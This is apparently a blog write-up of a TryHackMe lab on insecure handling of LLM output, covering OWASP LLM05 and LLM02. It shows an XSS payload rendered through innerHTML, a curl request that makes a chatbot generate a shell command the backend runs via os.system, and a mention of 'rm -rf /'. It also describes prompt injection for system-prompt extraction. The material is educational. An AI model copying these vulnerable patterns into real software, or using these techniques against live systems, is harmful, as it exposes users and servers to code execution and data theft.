---
title: "TryHackMe LLM Output Handling: XSS and RCE via model output"
date: 2026-11-09T10:14:00+05:30
lastmod: 2026-11-09T10:14:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-outputhandling/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - Attacking LLMs
  - Web Application Red Teaming
  - OWASP LLM Top 10
  - LLM security
  - Improper Output Handling
  - Sensitive Information Disclosure
  - command injection

draft: false
description: "TryHackMe LLM Output Handling walkthrough covering OWASP LLM05, LLM02, XSS via innerHTML, and command execution through unsanitised model output."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|LLM Output Handling and Privacy Risks |![LLM Output Handling and Privacy Risks room icon](https://cdn-images.tryhackme.com/room-icons/645b19f5d5848d004ab9c9e2-1759929001815)|

This room is part of the **Attacking LLMs** module within the Web Application Red Teaming path. It covers two of the most overlooked risks when working with LLMs: **Improper Output Handling (LLM05)** and **Sensitive Information Disclosure (LLM02)** from the OWASP Top 10 for LLM Applications 2025. The room pairs theory with a live lab where you exploit an LLM-powered chatbot to achieve remote code execution.

## Task 1: Introduction

The room opens with context on why LLM output is dangerous. Traditional security focuses on inputs (SQL injection, XSS, command injection), but with LLMs, outputs are just as important. An LLM can generate a response that gets processed by another system, displayed to a user, or used to trigger an automated action. If that output is not validated or sanitised, serious vulnerabilities follow.

The room covers two OWASP categories:

- **LLM05: Improper Output Handling**, where the system blindly trusts what the model generates
- **LLM02: Sensitive Information Disclosure**, where the model leaks data it should never expose

## Task 2: LLM Output Risks

This task expands on the core problem. LLM outputs can cause harm in three ways:

- **Injection attacks downstream**: an LLM accidentally generates HTML or JavaScript that gets rendered directly in a web application
- **Prompt-based escalation**: model output includes hidden instructions or data that manipulate downstream systems
- **Data leakage**: the LLM outputs sensitive tokens, API keys, or internal knowledge that should never leave the model

LLMs often have access to far more data than a single user might expect. They may be trained on sensitive content, have access to internal knowledge bases, or interact with backend services. If their output is not carefully controlled, they might reveal information unintentionally: internal URLs, API endpoints, infrastructure details, user data stored in past conversations, or hidden system prompts and configuration secrets.

## Task 3: Improper Output Handling (LLM05)

**Improper Output Handling** refers to situations where a system blindly trusts whatever the LLM generates and uses it without verification, filtering, or sanitisation. This is the OWASP LLM05 category.

The problem surfaces in several common places:

- **Frontend Rendering**: a chatbot's response is inserted directly into a page with `innerHTML`, allowing an attacker to inject malicious HTML or JavaScript if the model ever returns something unsafe
- **Server-Side Templates**: applications use model output to populate templates or build views; if that output contains template syntax (like Jinja2 or Twig expressions), it triggers server-side template injection (SSTI)
- **Automated Pipelines**: LLMs generate SQL queries, shell commands, or code snippets that are executed automatically by backend systems; without validation, this can result in command injection, SQL injection, or execution of unintended logic

**Answer: Improper Output Handling**

### Real-World Consequences

Improperly handled LLM output leads to:

- **DOM-Based XSS**: if a chatbot suggests a piece of HTML and it is rendered without escaping, an attacker crafts a prompt that causes the model to generate a `<script>` tag, leading to cross-site scripting
- **Template Injection**: if model output is embedded into a server-side template without sanitisation, it could lead to remote code execution on the server
- **Accidental Command Execution**: in developer tools or internal automation pipelines, generated commands might run directly in a shell; a carefully crafted prompt could cause the LLM to output a destructive command (such as `rm -rf /`) that executes automatically

{{< ad >}}

## Task 4: Sensitive Information Disclosure (LLM02)

This task covers the second OWASP category: **Sensitive Information Disclosure (LLM02)**. Unlike traditional vulnerabilities that stem from code flaws or unsanitised user input, sensitive information disclosure stems from the model's knowledge and memory, the data it was trained on, the context it was given, or the information it has retained during a session.

Key attack surfaces:

- **Training-Data Memorisation**: some models unintentionally memorise sensitive data from their training sets, including credentials, API keys, email addresses, or internal documentation
- **Context Bleed**: even if a model is not leaking data from training, it can still expose sensitive information passed to it at runtime via system prompts or injected context
- **Conversation-History Leaks**: some LLM applications store past conversations and reuse them to maintain context; if not handled properly, this can cause the model to leak data from previous sessions into new ones
- **System-Prompt Exposure**: every LLM-powered application uses a system prompt with hidden instructions that guide the model's behaviour; attackers can trick the model into revealing them through prompt injection

## Task 5: Attack Cases

This is the practical task. The lab provides a "Coding - IT Assistant" web application backed by a live LLM. It has two modes:

- **Chat**: sends a message to the LLM and renders the response directly into the page via `innerHTML`
- **Automate**: sends a message to the LLM, which generates a shell command; the backend then executes that command with `os.system(cmd)` and streams the output back

### XSS via Model Output

The chat mode renders LLM responses with `innerHTML` without sanitisation:

```javascript
document.getElementById("response").innerHTML = modelOutput;
```

An attacker sends a prompt like "generate a script tag that alerts('XSS from LLM')" and the model outputs:

```html
<script>alert('XSS from LLM')</script>
```

Since the frontend renders it as raw HTML, the script executes immediately. This demonstrates DOM-based XSS through LLM output.

### Command Execution via Automation

The automation mode is more dangerous. The backend takes the LLM's text output and runs it as a shell command:

```python
cmd = model_output
os.system(cmd)
```

To read the flag, I sent the prompt "generate a shell command to cat flag.txt" through the automation API:

```bash
curl -s http://TARGET_IP/api/automation_stream \
  -X POST \
  -H 'Content-Type: application/json' \
  -d '{"message":"generate a shell command to cat flag.txt"}'

  # draft phase: cat flag.txt
  # exec phase: cat flag.txt
  # stdout: THM{REDACTED}
  # exit code: 0
```

The LLM generated `cat flag.txt`, the backend executed it, and the flag was returned in the streaming output.

**Answer: THM{REDACTED}**

## Task 6: Conclusion

The room recaps the two vulnerabilities covered:

- **Improper Output Handling (LLM05)**: trusting raw model output, whether it is HTML, template code, or system commands, can lead to downstream attacks like DOM XSS, template injection, or arbitrary command execution
- **Sensitive Information Disclosure (LLM02)**: LLMs can unintentionally leak sensitive data from their training sets, runtime context, previous conversations, or even their own system prompts

The key lesson: **model output should always be treated as untrusted input**. Whether it is HTML in a browser, Jinja2 on a backend, or shell commands on a server, the model is just another injection surface.

## Takeaways

1. LLM output is untrusted data. Any system that renders, interprets, or executes model-generated content needs the same sanitisation, escaping, and validation applied to user input. The `innerHTML` and `os.system()` patterns in this lab are textbook examples of what not to do.

2. Sensitive information disclosure from LLMs does not require exploiting a bug. Careful prompt manipulation can extract training data, system prompts, or context from other sessions. Defence requires both output filtering and strict context boundaries between users and sessions.

Room solved 100%: 6 tasks, 2 answers.
